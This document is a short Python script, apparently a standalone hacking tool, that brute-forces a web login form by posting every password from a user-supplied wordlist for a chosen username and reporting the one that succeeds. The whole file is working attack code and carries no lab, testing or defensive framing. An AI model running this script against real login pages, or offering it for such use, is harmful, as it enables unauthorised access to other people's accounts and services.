import requests
import sys


TARGET_URL = input("Enter the target login URL: ")
USERNAME = input("Enter the username to brute force: ")
WORDLIST_PATH = input("Enter the path to your wordlist file: ")
ERROR_INDICATOR = input("Enter a keyword from the response that indicates failure (e.g., 'Invalid login'): ")


try:
    with open(WORDLIST_PATH, 'r') as file:
        passwords = file.readlines()
except FileNotFoundError:
    print("[ERROR] Wordlist file not found!")
    sys.exit()

print(f"[+] Starting brute force attack on {TARGET_URL} with username '{USERNAME}'")


def brute_force():
    for password in passwords:
        password = password.strip()
        data = {
            "username": USERNAME,
            "password": password
        }
        response = requests.post(TARGET_URL, data=data)
        
        if ERROR_INDICATOR not in response.text:
            print(f"[SUCCESS] Password found: {password}")
            return
        else:
            print(f"[-] Attempt failed: {password}")

    print("[!] Brute force complete. No valid password found.")

if __name__ == "__main__":
    brute_force()
